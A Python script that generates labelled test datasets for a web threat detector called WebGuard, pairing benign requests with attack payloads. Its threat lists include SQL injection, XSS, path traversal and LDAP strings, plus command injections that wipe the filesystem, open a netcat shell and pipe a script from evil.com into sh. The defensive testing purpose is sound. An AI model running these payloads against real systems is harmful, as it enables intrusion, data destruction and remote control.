#!/usr/bin/env python3
"""
Comprehensive Test Data Generator for WebGuard
Generates realistic test datasets for comprehensive system validation
"""

import json
import csv
import random
import string
import base64
from datetime import datetime, timedelta
from typing import List, Dict, Any
import os

class ComprehensiveTestDataGenerator:
    def __init__(self):
        self.output_dir = "tests/data"
        os.makedirs(self.output_dir, exist_ok=True)
        
    def generate_all_test_data(self):
        """Generate all comprehensive test datasets"""
        print("🔧 Generating Comprehensive WebGuard Test Data...")
        
        # Generate different types of test data
        self.generate_threat_samples()
        self.generate_benign_samples()
        self.generate_mixed_traffic_samples()
        self.generate_performance_test_data()
        self.generate_learning_validation_data()
        self.generate_edge_case_data()
        self.generate_real_world_scenarios()
        
        print("✅ All comprehensive test data generated successfully!")
        
    def generate_threat_samples(self):
        """Generate comprehensive threat samples"""
        print("🎯 Generating threat samples...")
        
        threats = []
        
        # SQL Injection variants
        sql_injections = [
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM admin --",
            "' OR '1'='1' --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' UNION SELECT username, password FROM users --",
            "'; UPDATE users SET password='hacked' WHERE id=1; --",
            "' OR 1=1 LIMIT 1 OFFSET 1 --",
            "'; DELETE FROM logs WHERE date < '2023-01-01'; --"
        ]
        
        # XSS variants
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
        
        # Path Traversal variants
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..//..//..//etc//passwd",
            "..\\..\\..\\boot.ini",
            "....\\....\\....\\windows\\win.ini",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini"
        ]
        
        # Command Injection variants
        command_injections = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "; ls -la",
            "| nc -l -p 4444 -e /bin/sh",
            "&& curl http://evil.com/shell.sh | sh",
            "; wget http://malware.com/backdoor",
            "| python -c 'import os; os.system(\"rm -rf /\")'",
            "&& echo 'hacked' > /tmp/pwned",
            "; cat /proc/version"
        ]
        
        # LDAP Injection variants
        ldap_injections = [
            "*)(&(objectClass=*)",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*))(|(cn=*",
            "*))%00",
            "admin*",
            "*)(|(objectClass=*)",
            "*)(&(|(objectClass=*)(cn=*))",
            "*)(mail=*))%00",
            "admin))(|(uid=*"
        ]
        
        # Add all threat types
        for i, threat in enumerate(sql_injections):
            threats.append({
                "id": f"sql_{i+1}",
                "type": "sql_injection",
                "payload": threat,
                "severity": "high",
                "expected_score": random.uniform(0.8, 1.0),
                "description": f"SQL Injection variant {i+1}"
            })
            
        for i, threat in enumerate(xss_attacks):
            threats.append({
                "id": f"xss_{i+1}",
                "type": "xss",
                "payload": threat,
                "severity": "high",
                "expected_score": random.uniform(0.7, 0.95),
                "description": f"XSS attack variant {i+1}"
            })
            
        for i, threat in enumerate(path_traversals):
            threats.append({
                "id": f"path_{i+1}",
                "type": "path_traversal",
                "payload": threat,
                "severity": "medium",
                "expected_score": random.uniform(0.6, 0.9),
                "description": f"Path traversal variant {i+1}"
            })
            
        for i, threat in enumerate(command_injections):
            threats.append({
                "id": f"cmd_{i+1}",
                "type": "command_injection",
                "payload": threat,
                "severity": "critical",
                "expected_score": random.uniform(0.85, 1.0),
                "description": f"Command injection variant {i+1}"
            })
            
        for i, threat in enumerate(ldap_injections):
            threats.append({
                "id": f"ldap_{i+1}",
                "type": "ldap_injection",
                "payload": threat,
                "severity": "medium",
                "expected_score": random.uniform(0.5, 0.8),
                "description": f"LDAP injection variant {i+1}"
            })
        
        # Save threat samples
        self.save_data(threats, "threat_samples.json")
        self.save_csv(threats, "threat_samples.csv")
        print(f"  Generated {len(threats)} threat samples")
        
    def generate_benign_samples(self):
        """Generate comprehensive benign samples"""
        print("✅ Generating benign samples...")
        
        benign = []
        
        # Normal HTTP requests
        http_requests = [
            "GET /api/users HTTP/1.1",
            "POST /api/login HTTP/1.1",
            "GET /dashboard HTTP/1.1",
            "POST /api/data HTTP/1.1",
            "GET /profile HTTP/1.1",
            "PUT /api/user/123 HTTP/1.1",
            "DELETE /api/session HTTP/1.1",
            "GET /api/health HTTP/1.1",
            "POST /api/upload HTTP/1.1",
            "GET /static/css/style.css HTTP/1.1"
        ]
        
        # Normal SQL queries
        sql_queries = [
            "SELECT * FROM users WHERE id = 1",
            "INSERT INTO logs (message, timestamp) VALUES ('Login', NOW())",
            "UPDATE users SET last_login = NOW() WHERE id = 1",
            "DELETE FROM sessions WHERE expires < NOW()",
            "SELECT COUNT(*) FROM products WHERE category = 'electronics'",
            "SELECT name, email FROM users ORDER BY name",
            "INSERT INTO orders (user_id, total) VALUES (1, 99.99)",
            "UPDATE products SET stock = stock - 1 WHERE id = 1",
            "SELECT * FROM categories ORDER BY name LIMIT 10",
            "DELETE FROM temp_data WHERE created < DATE_SUB(NOW(), INTERVAL 1 DAY)"
        ]
        
        # Normal form data
        form_data = [
            "username=john&password=secret123",
            "email=user@example.com&name=John Doe",
            "search=laptop computers&category=electronics",
            "comment=Great product! Highly recommended.",
            "address=123 Main St&city=New York&zip=10001",
            "phone=555-1234&country=USA",
            "message=Hello, I need help with my order",
            "title=Product Review&rating=5",
            "quantity=2&product_id=123",
            "newsletter=true&preferences=email"
        ]
        
        # Normal JSON payloads
        json_payloads = [
            '{"name": "John", "age": 30, "city": "New York"}',
            '{"product": "laptop", "price": 999.99, "stock": 10}',
            '{"user_id": 123, "action": "login", "timestamp": "2024-01-01T10:00:00Z"}',
            '{"query": "search term", "filters": {"category": "books", "price_max": 50}}',
            '{"order_id": 456, "items": [{"id": 1, "qty": 2}, {"id": 2, "qty": 1}]}',
            '{"settings": {"theme": "dark", "notifications": true, "language": "en"}}',
            '{"report": {"type": "sales", "period": "monthly", "format": "pdf"}}',
            '{"user": {"email": "test@example.com", "role": "user", "active": true}}',
            '{"backup": {"frequency": "daily", "retention": 30, "compress": true}}',
            '{"config": {"debug": false, "cache": true, "timeout": 30}}'
        ]
        
        # Add all benign types
        for i, request in enumerate(http_requests):
            benign.append({
                "id": f"http_{i+1}",
                "type": "http_request",
                "payload": request,
                "expected_score": random.uniform(0.0, 0.2),
                "description": f"Normal HTTP request {i+1}"
            })
            
        for i, query in enumerate(sql_queries):
            benign.append({
                "id": f"sql_benign_{i+1}",
                "type": "sql_query",
                "payload": query,
                "expected_score": random.uniform(0.0, 0.3),
                "description": f"Legitimate SQL query {i+1}"
            })
            
        for i, data in enumerate(form_data):
            benign.append({
                "id": f"form_{i+1}",
                "type": "form_data",
                "payload": data,
                "expected_score": random.uniform(0.0, 0.1),
                "description": f"Normal form data {i+1}"
            })
            
        for i, payload in enumerate(json_payloads):
            benign.append({
                "id": f"json_{i+1}",
                "type": "json_payload",
                "payload": payload,
                "expected_score": random.uniform(0.0, 0.15),
                "description": f"Normal JSON payload {i+1}"
            })
        
        # Save benign samples
        self.save_data(benign, "benign_samples.json")
        self.save_csv(benign, "benign_samples.csv")
        print(f"  Generated {len(benign)} benign samples")
        
    def generate_mixed_traffic_samples(self):
        """Generate mixed traffic for realistic testing"""
        print("🌐 Generating mixed traffic samples...")
        
        mixed_traffic = []
        
        # Generate 1000 mixed requests (80% benign, 20% threats)
        for i in range(1000):
            if random.random() < 0.8:  # 80% benign
                request_type = random.choice(["GET", "POST", "PUT", "DELETE"])
                endpoint = random.choice(["/api/users", "/dashboard", "/profile", "/settings", "/data"])
                payload = f"{request_type} {endpoint}/{random.randint(1, 1000)} HTTP/1.1"
                is_threat = False
                expected_score = random.uniform(0.0, 0.3)
            else:  # 20% threats
                threat_types = ["'; DROP TABLE", "<script>alert", "../../../etc/", "; rm -rf"]
                threat = random.choice(threat_types)
                payload = f"{threat}{random.randint(1, 100)}"
                is_threat = True
                expected_score = random.uniform(0.6, 1.0)
                
            mixed_traffic.append({
                "id": f"mixed_{i+1}",
                "payload": payload,
                "is_threat": is_threat,
                "expected_score": expected_score,
                "timestamp": (datetime.now() - timedelta(minutes=random.randint(0, 1440))).isoformat()
            })
        
        # Save mixed traffic
        self.save_data(mixed_traffic, "mixed_traffic_samples.json")
        self.save_csv(mixed_traffic, "mixed_traffic_samples.csv")
        print(f"  Generated {len(mixed_traffic)} mixed traffic samples")
        
    def generate_performance_test_data(self):
        """Generate data for performance testing"""
        print("⚡ Generating performance test data...")
        
        performance_data = []
        
        # Generate high-volume test data
        for i in range(10000):
            request_types = ["GET", "POST", "PUT", "DELETE", "PATCH"]
            endpoints = ["/api/data", "/api/users", "/api/orders", "/api/products", "/api/reports"]
            
            request_type = random.choice(request_types)
            endpoint = random.choice(endpoints)
            user_id = random.randint(1, 1000)
            
            payload = f"{request_type} {endpoint}/{user_id} HTTP/1.1"
            
            # Add some threats for realistic mix
            if random.random() < 0.05:  # 5% threats
                payload += f"'; DROP TABLE test{i}; --"
                is_threat = True
                expected_score = random.uniform(0.7, 1.0)
            else:
                is_threat = False
                expected_score = random.uniform(0.0, 0.2)
            
            performance_data.append({
                "id": f"perf_{i+1}",
                "payload": payload,
                "is_threat": is_threat,
                "expected_score": expected_score,
                "size_bytes": len(payload),
                "complexity": "low" if len(payload) < 50 else "medium" if len(payload) < 100 else "high"
            })
        
        # Save performance data
        self.save_data(performance_data, "performance_test_data.json")
        self.save_csv(performance_data, "performance_test_data.csv")
        print(f"  Generated {len(performance_data)} performance test samples")
        
    def generate_learning_validation_data(self):
        """Generate data for learning system validation"""
        print("📚 Generating learning validation data...")
        
        learning_data = {
            "missed_threats": [],
            "false_positives": [],
            "learning_scenarios": []
        }
        
        # Generate missed threat events
        for i in range(50):
            missed_threat = {
                "id": f"missed_{i+1}",
                "original_request": f"normal_looking_request_{i}",
                "original_threat_score": random.uniform(0.1, 0.4),
                "actual_threat_level": random.uniform(0.7, 1.0),
                "discovery_method": random.choice(["security_audit", "incident_response", "external_detection"]),
                "discovery_delay_hours": random.uniform(1, 168),  # 1 hour to 1 week
                "consequence_severity": random.uniform(0.5, 1.0),
                "attack_type": random.choice(["sql_injection", "xss", "command_injection", "path_traversal"])
            }
            learning_data["missed_threats"].append(missed_threat)
        
        # Generate false positive events
        for i in range(30):
            false_positive = {
                "id": f"fp_{i+1}",
                "original_request": f"legitimate_request_{i}",
                "original_threat_score": random.uniform(0.6, 0.9),
                "actual_threat_level": random.uniform(0.0, 0.2),
                "impact_severity": random.uniform(0.3, 0.8),
                "user_feedback": random.choice(["false_alarm", "legitimate_request", "business_critical"])
            }
            learning_data["false_positives"].append(false_positive)
        
        # Generate learning scenarios
        scenarios = [
            "high_threat_environment",
            "low_threat_environment", 
            "mixed_environment",
            "targeted_attack_campaign",
            "normal_business_operations"
        ]
        
        for scenario in scenarios:
            learning_data["learning_scenarios"].append({
                "scenario": scenario,
                "duration_hours": random.randint(24, 168),
                "threat_density": random.uniform(0.01, 0.3),
                "expected_adaptation": random.choice(["increase_sensitivity", "decrease_sensitivity", "maintain_balance"])
            })
        
        # Save learning validation data
        self.save_data(learning_data, "learning_validation_data.json")
        print(f"  Generated learning validation data with {len(learning_data['missed_threats'])} missed threats and {len(learning_data['false_positives'])} false positives")
        
    def generate_edge_case_data(self):
        """Generate edge cases and corner cases"""
        print("🔍 Generating edge case data...")
        
        edge_cases = []
        
        # Empty and null cases
        edge_cases.extend([
            {"id": "edge_empty", "payload": "", "type": "empty_input", "expected_score": 0.0},
            {"id": "edge_null", "payload": None, "type": "null_input", "expected_score": 0.0},
            {"id": "edge_whitespace", "payload": "   \t\n  ", "type": "whitespace_only", "expected_score": 0.0}
        ])
        
        # Very long inputs
        long_benign = "A" * 10000
        long_threat = "'; DROP TABLE users; --" + "A" * 10000
        edge_cases.extend([
            {"id": "edge_long_benign", "payload": long_benign, "type": "long_benign", "expected_score": 0.1},
            {"id": "edge_long_threat", "payload": long_threat, "type": "long_threat", "expected_score": 0.9}
        ])
        
        # Unicode and encoding edge cases
        unicode_cases = [
            "SELECT * FROM users WHERE name = 'José'",
            "'; DROP TABLE users; -- 中文",
            "<script>alert('مرحبا')</script>",
            "../../../etc/passwd\x00.txt",
            "'; DROP TABLE users\r\n; --"
        ]
        
        for i, case in enumerate(unicode_cases):
            edge_cases.append({
                "id": f"edge_unicode_{i+1}",
                "payload": case,
                "type": "unicode_encoding",
                "expected_score": 0.5 if "DROP" in case or "<script>" in case else 0.2
            })
        
        # Binary data
        binary_data = base64.b64encode(b'\x00\x01\x02\x03\x04\x05').decode()
        edge_cases.append({
            "id": "edge_binary",
            "payload": binary_data,
            "type": "binary_data",
            "expected_score": 0.3
        })
        
        # Save edge cases
        self.save_data(edge_cases, "edge_case_data.json")
        self.save_csv(edge_cases, "edge_case_data.csv")
        print(f"  Generated {len(edge_cases)} edge case samples")
        
    def generate_real_world_scenarios(self):
        """Generate realistic attack scenarios"""
        print("🌍 Generating real-world scenarios...")
        
        scenarios = []
        
        # Multi-stage attack scenario
        scenarios.append({
            "id": "scenario_multistage",
            "name": "Multi-stage SQL Injection Attack",
            "description": "Realistic multi-step attack progression",
            "stages": [
                {"stage": 1, "payload": "' OR '1'='1", "expected_score": 0.8},
                {"stage": 2, "payload": "' UNION SELECT null, null, null --", "expected_score": 0.9},
                {"stage": 3, "payload": "' UNION SELECT username, password, null FROM users --", "expected_score": 0.95},
                {"stage": 4, "payload": "'; INSERT INTO users VALUES ('attacker', 'password'); --", "expected_score": 0.98}
            ]
        })
        
        # Evasion attempt scenario
        scenarios.append({
            "id": "scenario_evasion",
            "name": "Evasion Techniques",
            "description": "Various evasion and obfuscation techniques",
            "techniques": [
                {"technique": "url_encoding", "payload": "%27%20OR%20%271%27%3D%271", "expected_score": 0.8},
                {"technique": "double_encoding", "payload": "%2527%2520OR%2520%25271%2527%253D%25271", "expected_score": 0.7},
                {"technique": "case_variation", "payload": "' oR '1'='1", "expected_score": 0.8},
                {"technique": "comment_insertion", "payload": "'/**/OR/**/1=1", "expected_score": 0.85},
                {"technique": "whitespace_variation", "payload": "'%09OR%091=1", "expected_score": 0.8}
            ]
        })
        
        # Business logic attack scenario
        scenarios.append({
            "id": "scenario_business_logic",
            "name": "Business Logic Attack",
            "description": "Attacks targeting business logic flaws",
            "attacks": [
                {"attack": "price_manipulation", "payload": "price=-100&quantity=1", "expected_score": 0.6},
                {"attack": "privilege_escalation", "payload": "role=admin&user_id=1", "expected_score": 0.7},
                {"attack": "race_condition", "payload": "transfer_amount=1000000&account=123", "expected_score": 0.5},
                {"attack": "workflow_bypass", "payload": "status=approved&bypass_review=true", "expected_score": 0.6}
            ]
        })
        
        # Save scenarios
        self.save_data(scenarios, "real_world_scenarios.json")
        print(f"  Generated {len(scenarios)} real-world attack scenarios")
        
    def save_data(self, data: List[Dict[Any, Any]], filename: str):
        """Save data as JSON"""
        filepath = os.path.join(self.output_dir, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
            
    def save_csv(self, data: List[Dict[Any, Any]], filename: str):
        """Save data as CSV"""
        if not data:
            return
            
        filepath = os.path.join(self.output_dir, filename)
        with open(filepath, 'w', newline='', encoding='utf-8') as f:
            if isinstance(data[0], dict):
                writer = csv.DictWriter(f, fieldnames=data[0].keys())
                writer.writeheader()
                writer.writerows(data)

if __name__ == "__main__":
    generator = ComprehensiveTestDataGenerator()
    generator.generate_all_test_data()